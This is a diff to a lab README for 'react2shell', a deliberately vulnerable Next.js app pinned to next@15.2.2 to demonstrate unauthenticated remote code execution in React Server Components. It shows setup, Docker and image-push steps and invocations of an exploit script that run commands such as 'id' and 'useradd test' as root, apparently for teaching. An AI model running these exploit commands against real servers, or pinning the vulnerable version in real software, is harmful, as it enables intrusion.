@@ -3,9 +3,12 @@
 [Back](../README.md)
 
 - [reat2shell: insecure app](#reat2shell-insecure-app)
-  - [Local App](#local-app)
-  - [Dockerize](#dockerize)
-  - [Push image](#push-image)
+  - [Insecure Application](#insecure-application)
+    - [React App](#react-app)
+    - [Dockerize](#dockerize)
+    - [Push image](#push-image)
+  - [Secure Application](#secure-application)
+    - [React App](#react-app-1)
 
 ---
 
@@ -13,38 +16,40 @@
   - version: `react@19.0.0` (bundled via `next@15.2.2`)
   - issue: unauthenticated RCE in React Server Components (Flight payload deserialization)
 
-| #   | Steps                 | Step                                  |
-| --- | --------------------- | ------------------------------------- |
-| 1   | local app and exploit | create simple Next.js app and exploit |
-| 2   | Dockerize             | Create dokerfile, run and expoit      |
-| 3   | push image            | build and push                        |
+| #   | Steps                    | Step                                                       |
+| --- | ------------------------ | ---------------------------------------------------------- |
+| 1   | insecure app and exploit | create simple Next.js app with vulnerabilities and exploit |
+| 2   | Dockerize                | Create dokerfile, run and expoit                           |
+| 3   | push image               | build and push                                             |
 
 - reference: https://github.com/msanft/CVE-2025-55182
 
 ---
 
-## Local App
+## Insecure Application
+
+### React App
 
 - init app
 
 ```sh
 # init next.js
-mkdir ./app/react2shell
-npx create-next-app@latest ./app/react2shell --js --app --src-dir --no-tailwind --no-eslint
+mkdir ./app/react2shell-insecure
+npx create-next-app@latest ./app/react2shell-insecure --js --app --src-dir --no-tailwind --no-eslint
 # pin risky version
-npm install --prefix ./app/react2shell next@15.2.2
+npm install --prefix ./app/react2shell-insecure next@15.2.2
 ```
 
-![app_install_nextjs](./img/app_install_nextjs.png)
+![app_insecure_install](./img/app_insecure_install.png)
 
 - run app
 
 ```sh
 # run app
-npm run dev --prefix ./app/react2shell
+npm run dev --prefix ./app/react2shell-insecure
 ```
 
-![app_home_page](./img/app_home_page.png)
+![app_insecure_homepage](./img/app_insecure_homepage.png)
 
 - Exploit vulnerability: launch calculator in windows
 
@@ -56,11 +61,13 @@ python ./scripts/rce.py http://localhost:3000 calc
 # 1:E{"digest":"712750234","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
 ```
 
-![app_exploit_cal](./img/app_exploit_cal.png)
+![app_insecure_exploit_cal](./img/app_insecure_exploit_cal.png)
 
 ---
 
-## Dockerize
+---
+
+### Dockerize
 
 ```sh
 # build the image
@@ -80,17 +87,8 @@ python scripts/rce.py http://localhost:3000 id
 # uid=0(root) gid=0(root) groups=0(root)
 
 python scripts/rce.py http://localhost:3000 "useradd test"
-# status code: 500
-# response text:
-# 0:{"a":"$@1","f":"","b":"development"}
-# 1:E{"digest":"1271169623","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
 
 python scripts/rce.py http://localhost:3000 "id test"
-# status code: 500
-# response text:
-# 0:{"a":"$@1","f":"","b":"development"}
-# 1:E{"digest":"uid=1001(test) gid=1001(test) groups=1001(test)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
-
 # executable response:
 # uid=1001(test) gid=1001(test) groups=1001(test)
 
@@ -100,7 +98,7 @@ docker rm react2shell-insecure -f
 
 ---
 
-## Push image
+### Push image
 
 ```sh
 # build
@@ -113,11 +111,6 @@ docker push simonangelfong/react2shell:insecure
 # test
 docker run --rm -d --name react2shell-insecure -p 3000:3000 simonangelfong/react2shell:insecure
 python scripts/rce.py http://localhost:3000 id
-# status code: 500
-# response text:
-# 0:{"a":"$@1","f":"","b":"development"}
-# 1:E{"digest":"uid=0(root) gid=0(root) groups=0(root)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
-
 # executable response:
 # uid=0(root) gid=0(root) groups=0(root)
 
@@ -125,3 +118,9 @@ python scripts/rce.py http://localhost:3000 id
 docker rm react2shell-insecure -f
 # react2shell-insecure
 ```
+
+---
+
+## Secure Application
+
+### React App
